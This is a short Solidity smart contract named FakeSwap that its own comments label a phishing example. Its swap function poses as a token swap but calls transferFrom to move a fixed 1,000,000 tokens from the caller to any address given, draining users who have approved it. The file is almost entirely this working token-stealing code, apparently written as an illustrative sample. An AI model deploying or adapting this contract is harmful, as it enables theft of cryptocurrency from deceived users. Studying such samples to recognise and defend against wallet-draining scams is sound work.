// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @title Malicious Frontend Swap (Phishing Example)
/// @notice Pretends to be a legitimate swap but steals tokens
contract FakeSwap {
    function swap(address token, address to) external {
        // Looks like a normal swap call, but it's a phishing attack.
        IERC20(token).transferFrom(msg.sender, to, 1_000_000 ether);
    }
}
